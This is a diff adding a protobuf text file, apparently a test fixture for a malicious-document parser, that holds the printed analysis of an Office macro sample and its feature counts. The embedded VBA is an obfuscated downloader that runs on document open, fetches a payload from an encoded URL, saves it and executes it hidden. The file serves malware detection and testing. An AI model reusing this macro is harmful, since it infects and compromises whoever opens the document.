@@ -1,0 +1,176 @@
+# proto-file: third_party/maldoca/service/proto/maldoca_service.proto
+# proto-message: ProcessDocumentResponse
+parsed_document {
+  sha256: "8821dd555708adbee310071a507292bb9892ec0b7db80337696fc078fbbeaee9"
+  doc_type: VB
+  general_doc_type: GENERAL_DOC_TYPE_VBA
+  file_name: "vba1_xor_0x42_encoded.bin"
+  file_size: 23552
+  office {
+    doc_type: VB
+    general_doc_type: GENERAL_DOC_TYPE_VBA
+    parser_output {
+      script_features {
+        scripts {
+          vba_code {
+            chunk {
+              code: "Attribute VB_Name = \"ThisDocument\"\r\nAttribute VB_Base = \"1Normal.ThisDocument\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = True\r\nAttribute VB_Customizable = True\r\n\'< protected by www.CrunchCode.de - DO NOT CHANGE OR REMOVE THIS LABEL! >\r\nOption Explicit\r\nConst IyRPrygtFXaahnAvuvIuznZ = \"(%{z5B&\302\255j|lj\"\r\nConst lPqyAUtAaPI = \"oHW}#AOHMx/Jb\302\255Xm._J)dYQ%}av2^b\": Const CphDVKIYVn = _\r\n\"v+N+w]JjP<N|7L/Y\302\255A!=d.SDyj!R!zi-`YK` .N&QkW2TzHs6}\"\r\nConst FVpwDmUidPqTmMujU = \"4L$M,|\302\255W-744BzFX{f<bJA613SKc9SZ}b\"\r\nConst uJtDrzqUdrTehtmVsaJLE = _\r\n\"><vC:1\302\255#\'l\": Const hWyTDWRNeaXKGxHLyykCK = _\r\n\"8nV_AT\302\255TyEG$%&-fjcD\": Public QBIIPIoeezclygXpiEoyyxDjTSLNnJy As String\r\nFunction _\r\nijGUPMRVgPRMquKqudqabqpYBOjMipM(NFCcAtwXoVIdPbDXJXl As String) As _\r\nString\r\nDim _\r\nLGohpZhaDSRizbFphmOG As _\r\nByte, _\r\nRDPNapbYWhUvPtieFKkkQEjDgNC As _\r\nLong, hUgATgxNEQlhJbtDaBGLbonGoXirdYl As Integer, prpfOZsjabmLebQwSjgATNSlqX As Integer, TVaqflyeHxzlTeTtKV As Long, PoucdlBbmFaXCLOGRhRETHR As _\r\nLong, _\r\nhnQExfoEFrHxruaYdBWGlbMsK As _\r\nLong, _\r\nRYlMQsuCSpPYTz As _\r\nString, GEhTsccE As _\r\nString, gnKaKBjZKUicQVqj As String, _\r\nvxSmIsoJ As _\r\nString, OcYlQLPohrrLVbBNldLvRLDPnbhJXh As String\r\ngnKaKBjZKUicQVqj = _\r\n\"\"\r\nIf _\r\nNFCcAtwXoVIdPbDXJXl <> _\r\n\"\" Then\r\nvxSmIsoJ = NFCcAtwXoVIdPbDXJXl\r\nLGohpZhaDSRizbFphmOG = &H209 - 348\r\nprpfOZsjabmLebQwSjgATNSlqX = _\r\nInStr(NFCcAtwXoVIdPbDXJXl, _\r\nChr( _\r\nLGohpZhaDSRizbFphmOG))\r\nIf _\r\nQBIIPIoeezclygXpiEoyyxDjTSLNnJy = \"\" Then\r\nOcYlQLPohrrLVbBNldLvRLDPnbhJXh = _\r\n\"\"\"\"\r\nFor TVaqflyeHxzlTeTtKV = _\r\n&H5CC3 - 23715 To _\r\n&H6384 - 25350\r\nIf _\r\nInStr(OcYlQLPohrrLVbBNldLvRLDPnbhJXh, _\r\nChr(TVaqflyeHxzlTeTtKV)) = 0 Then QBIIPIoeezclygXpiEoyyxDjTSLNnJy = _\r\nQBIIPIoeezclygXpiEoyyxDjTSLNnJy & _\r\nChr(TVaqflyeHxzlTeTtKV)\r\nNext TVaqflyeHxzlTeTtKV\r\nEnd If\r\nhnQExfoEFrHxruaYdBWGlbMsK = Len(QBIIPIoeezclygXpiEoyyxDjTSLNnJy)\r\nGEhTsccE = Left( _\r\nvxSmIsoJ, _\r\nprpfOZsjabmLebQwSjgATNSlqX - 1)\r\nvxSmIsoJ = _\r\nRight( _\r\nvxSmIsoJ, _\r\nLen(vxSmIsoJ) - prpfOZsjabmLebQwSjgATNSlqX)\r\nRYlMQsuCSpPYTz = _\r\n\"\"\r\nFor TVaqflyeHxzlTeTtKV = _\r\n1 To _\r\nLen(vxSmIsoJ) Step _\r\n2\r\nRYlMQsuCSpPYTz = RYlMQsuCSpPYTz & Mid( _\r\nvxSmIsoJ, TVaqflyeHxzlTeTtKV + _\r\n1, _\r\n1) & _\r\nMid(vxSmIsoJ, _\r\nTVaqflyeHxzlTeTtKV, _\r\n1)\r\nNext _\r\nTVaqflyeHxzlTeTtKV\r\nvxSmIsoJ = _\r\nRYlMQsuCSpPYTz\r\nPoucdlBbmFaXCLOGRhRETHR = _\r\n0\r\nFor TVaqflyeHxzlTeTtKV = 1 To _\r\nLen(vxSmIsoJ)\r\nRYlMQsuCSpPYTz = _\r\nMid( _\r\nvxSmIsoJ, TVaqflyeHxzlTeTtKV, 1)\r\nRDPNapbYWhUvPtieFKkkQEjDgNC = Asc(RYlMQsuCSpPYTz)\r\nprpfOZsjabmLebQwSjgATNSlqX = _\r\nInStr(QBIIPIoeezclygXpiEoyyxDjTSLNnJy, _\r\nRYlMQsuCSpPYTz)\r\nIf _\r\nprpfOZsjabmLebQwSjgATNSlqX = 0 Then\r\nIf RDPNapbYWhUvPtieFKkkQEjDgNC >= _\r\n(26543 - &H672F) Then\r\nRDPNapbYWhUvPtieFKkkQEjDgNC = _\r\nRDPNapbYWhUvPtieFKkkQEjDgNC + (&H4FDE - 20382)\r\nIf _\r\nRDPNapbYWhUvPtieFKkkQEjDgNC > ( _\r\n4459 - &H106C) Then RDPNapbYWhUvPtieFKkkQEjDgNC = RDPNapbYWhUvPtieFKkkQEjDgNC - (&H7680 - 30208)\r\nRYlMQsuCSpPYTz = _\r\nChr( _\r\nRDPNapbYWhUvPtieFKkkQEjDgNC)\r\nEnd If\r\ngnKaKBjZKUicQVqj = _\r\ngnKaKBjZKUicQVqj & _\r\nRYlMQsuCSpPYTz\r\nElse\r\nPoucdlBbmFaXCLOGRhRETHR = PoucdlBbmFaXCLOGRhRETHR + 1\r\nIf _\r\nPoucdlBbmFaXCLOGRhRETHR > _\r\nLen(GEhTsccE) Then PoucdlBbmFaXCLOGRhRETHR = _\r\n1\r\nhUgATgxNEQlhJbtDaBGLbonGoXirdYl = _\r\nAsc( _\r\nMid(GEhTsccE, PoucdlBbmFaXCLOGRhRETHR, _\r\n1))\r\nprpfOZsjabmLebQwSjgATNSlqX = _\r\nprpfOZsjabmLebQwSjgATNSlqX - hUgATgxNEQlhJbtDaBGLbonGoXirdYl\r\nWhile _\r\nprpfOZsjabmLebQwSjgATNSlqX > hnQExfoEFrHxruaYdBWGlbMsK\r\nprpfOZsjabmLebQwSjgATNSlqX = prpfOZsjabmLebQwSjgATNSlqX - hnQExfoEFrHxruaYdBWGlbMsK\r\nWend\r\nWhile prpfOZsjabmLebQwSjgATNSlqX < _\r\n0\r\nprpfOZsjabmLebQwSjgATNSlqX = prpfOZsjabmLebQwSjgATNSlqX + hnQExfoEFrHxruaYdBWGlbMsK\r\nWend\r\nIf prpfOZsjabmLebQwSjgATNSlqX = 0 Then prpfOZsjabmLebQwSjgATNSlqX = hnQExfoEFrHxruaYdBWGlbMsK\r\ngnKaKBjZKUicQVqj = _\r\ngnKaKBjZKUicQVqj & Mid( _\r\nQBIIPIoeezclygXpiEoyyxDjTSLNnJy, _\r\nprpfOZsjabmLebQwSjgATNSlqX, 1)\r\nEnd If\r\nNext _\r\nTVaqflyeHxzlTeTtKV\r\nEnd If\r\nijGUPMRVgPRMquKqudqabqpYBOjMipM = _\r\ngnKaKBjZKUicQVqj\r\nEnd Function\r\nSub AutoOpen()\r\nCall _\r\nPArJhruZTAkYcNpxEAkwNYiQiwesPSU\r\nEnd Sub\r\nFunction eZDcrcgtIySvdQusVBLoLHdDiKbxqba(AidOJolgpFVqpkBuAwHZ As _\r\nString) As String\r\neZDcrcgtIySvdQusVBLoLHdDiKbxqba = ijGUPMRVgPRMquKqudqabqpYBOjMipM(AidOJolgpFVqpkBuAwHZ)\r\nEnd Function\r\nFunction _\r\nSTHuCQdCeArahnzzhgBPnVZeDKQuCs( _\r\nByVal QeRelQcBclslkjwtbldAGFK As _\r\nString) As Boolean\r\nSTHuCQdCeArahnzzhgBPnVZeDKQuCs = ( _\r\nDir( _\r\nQeRelQcBclslkjwtbldAGFK) <> _\r\n\"\")\r\nEnd Function\r\nFunction _\r\nETGSjOgUCwfpEMmZwOBhoIZHotYFVcw(IAdCuWjqXSY As _\r\nString) As _\r\nString\r\nETGSjOgUCwfpEMmZwOBhoIZHotYFVcw = _\r\nijGUPMRVgPRMquKqudqabqpYBOjMipM( _\r\nIAdCuWjqXSY)\r\nEnd Function\r\nSub _\r\nPArJhruZTAkYcNpxEAkwNYiQiwesPSU()\r\nCall _\r\nRWdxiRcGrvsVlRYCbtLvreYMwUCrVP\r\nEnd Sub\r\nFunction gBZLDItyStOUXoHMrBStNzKelGWFoSl(OcqOmnfrevVvEX As String) As String\r\ngBZLDItyStOUXoHMrBStNzKelGWFoSl = ijGUPMRVgPRMquKqudqabqpYBOjMipM( _\r\nOcqOmnfrevVvEX)\r\nEnd Function\r\nSub Auto_Open()\r\nCall PArJhruZTAkYcNpxEAkwNYiQiwesPSU\r\nEnd Sub\r\nFunction _\r\nDMKEcZdrxcnTNEFkPFsOcnvPHKFSHrd( _\r\nbcOSQAiPagVSbKCgWflJQiocu As String) As String\r\nDMKEcZdrxcnTNEFkPFsOcnvPHKFSHrd = _\r\nijGUPMRVgPRMquKqudqabqpYBOjMipM( _\r\nbcOSQAiPagVSbKCgWflJQiocu)\r\nEnd Function\r\nSub _\r\nRWdxiRcGrvsVlRYCbtLvreYMwUCrVP()\r\nDim _\r\nvjMVFTgLBldkxI As _\r\nObject\r\nDim _\r\niZigDkDghYbBLeuIUgUGTKMEPRXncE As String\r\nDim path As _\r\nString\r\npath = Environ(eZDcrcgtIySvdQusVBLoLHdDiKbxqba( _\r\nIyRPrygtFXaahnAvuvIuznZ)) & fGvpqRAZBFlfNziOtVrhUVYCXdJnJIQ( _\r\nlPqyAUtAaPI)\r\niZigDkDghYbBLeuIUgUGTKMEPRXncE = gBZLDItyStOUXoHMrBStNzKelGWFoSl(CphDVKIYVn)\r\nSet vjMVFTgLBldkxI = _\r\nCreateObject( _\r\nETGSjOgUCwfpEMmZwOBhoIZHotYFVcw( _\r\nFVpwDmUidPqTmMujU))\r\nvjMVFTgLBldkxI.Open DMKEcZdrxcnTNEFkPFsOcnvPHKFSHrd( _\r\nuJtDrzqUdrTehtmVsaJLE), _\r\niZigDkDghYbBLeuIUgUGTKMEPRXncE, False\r\nvjMVFTgLBldkxI.Send\r\niZigDkDghYbBLeuIUgUGTKMEPRXncE = _\r\nvjMVFTgLBldkxI.ResponseBody\r\nnoKtkgqpwJfOKcRqc ( _\r\npath)\r\nIf _\r\nvjMVFTgLBldkxI.Status = _\r\n200 Then\r\nDim _\r\nzhIUlTXQotFEdcOQAHzwFMr As _\r\nObject: Set zhIUlTXQotFEdcOQAHzwFMr = _\r\nCreateObject( _\r\nQUBiifsFnHvEfglHOPscplvgCofOFpJ( _\r\nhWyTDWRNeaXKGxHLyykCK))\r\nzhIUlTXQotFEdcOQAHzwFMr.Open\r\nzhIUlTXQotFEdcOQAHzwFMr.Type = _\r\n1\r\nzhIUlTXQotFEdcOQAHzwFMr.Write vjMVFTgLBldkxI.ResponseBody\r\nzhIUlTXQotFEdcOQAHzwFMr.SaveToFile ( _\r\npath)\r\nzhIUlTXQotFEdcOQAHzwFMr.Close\r\nEnd If\r\nShell path, _\r\n0\r\nEnd Sub\r\nSub _\r\nnoKtkgqpwJfOKcRqc( _\r\nByVal GISMtAmdgtAQyNqPFuzsakpxswdW As _\r\nString)\r\nIf STHuCQdCeArahnzzhgBPnVZeDKQuCs( _\r\nGISMtAmdgtAQyNqPFuzsakpxswdW) Then\r\nSetAttr _\r\nGISMtAmdgtAQyNqPFuzsakpxswdW, vbNormal\r\nKill _\r\nGISMtAmdgtAQyNqPFuzsakpxswdW\r\nEnd If\r\nEnd Sub\r\nFunction fGvpqRAZBFlfNziOtVrhUVYCXdJnJIQ( _\r\nOHLXBULSrprOyql As _\r\nString) As String\r\nfGvpqRAZBFlfNziOtVrhUVYCXdJnJIQ = ijGUPMRVgPRMquKqudqabqpYBOjMipM(OHLXBULSrprOyql)\r\nEnd Function\r\nFunction _\r\nQUBiifsFnHvEfglHOPscplvgCofOFpJ(xuLXyvFMfXbGnkkzJhb As _\r\nString) As _\r\nString\r\nQUBiifsFnHvEfglHOPscplvgCofOFpJ = _\r\nijGUPMRVgPRMquKqudqabqpYBOjMipM(xuLXyvFMfXbGnkkzJhb)\r\nEnd Function\r\n\r\n\r\n\r\n"
+              filename: "ThisDocument.cls"
+              path: "/VBA/ThisDocument"
+              sha256_hex_string: "93641fdf83cd2ffb8a3612d39afc6709cd854006f1e09b10bedc91c80a312fe1"
+            }
+          }
+        }
+      }
+    }
+  }
+}
+document_features {
+  sha256: "8821dd555708adbee310071a507292bb9892ec0b7db80337696fc078fbbeaee9"
+  doc_type: VB
+  general_doc_type: GENERAL_DOC_TYPE_VBA
+  file_name: "vba1_xor_0x42_encoded.bin"
+  file_size: 23552
+  office {
+    doc_type: VB
+    general_doc_type: GENERAL_DOC_TYPE_VBA
+    vba_project_feature {
+      create_object_count: 2
+      create_object_non_literal_count: 2
+      standard_library_function_count {
+        key: 42
+        value: 1
+      }
+      standard_library_function_count {
+        key: 54
+        value: 1
+      }
+      standard_library_function_count {
+        key: 57
+        value: 1
+      }
+      standard_library_function_count {
+        key: 87
+        value: 2
+      }
+      standard_library_function_count {
+        key: 89
+        value: 1
+      }
+      standard_library_function_count {
+        key: 98
+        value: 1
+      }
+      standard_library_function_count {
+        key: 117
+        value: 2
+      }
+      standard_library_function_count {
+        key: 118
+        value: 4
+      }
+      standard_library_function_count {
+        key: 125
+        value: 3
+      }
+      standard_library_function_count {
+        key: 129
+        value: 1
+      }
+      standard_library_function_count {
+        key: 130
+        value: 5
+      }
+      standard_library_function_count {
+        key: 134
+        value: 5
+      }
+      standard_library_function_count {
+        key: 137
+        value: 1
+      }
+      standard_library_function_count {
+        key: 160
+        value: 2
+      }
+      standard_library_function_count {
+        key: 161
+        value: 1
+      }
+      standard_library_function_count {
+        key: 167
+        value: 1
+      }
+    }
+    vba_file_features {
+      create_object_count: 2
+      create_object_non_literal_count: 2
+      standard_library_function_count {
+        key: 42
+        value: 1
+      }
+      standard_library_function_count {
+        key: 54
+        value: 1
+      }
+      standard_library_function_count {
+        key: 57
+        value: 1
+      }
+      standard_library_function_count {
+        key: 87
+        value: 2
+      }
+      standard_library_function_count {
+        key: 89
+        value: 1
+      }
+      standard_library_function_count {
+        key: 98
+        value: 1
+      }
+      standard_library_function_count {
+        key: 117
+        value: 2
+      }
+      standard_library_function_count {
+        key: 118
+        value: 4
+      }
+      standard_library_function_count {
+        key: 125
+        value: 3
+      }
+      standard_library_function_count {
+        key: 129
+        value: 1
+      }
+      standard_library_function_count {
+        key: 130
+        value: 5
+      }
+      standard_library_function_count {
+        key: 134
+        value: 5
+      }
+      standard_library_function_count {
+        key: 137
+        value: 1
+      }
+      standard_library_function_count {
+        key: 160
+        value: 2
+      }
+      standard_library_function_count {
+        key: 161
+        value: 1
+      }
+      standard_library_function_count {
+        key: 167
+        value: 1
+      }
+    }
+  }
+}
+exported_features {
+}
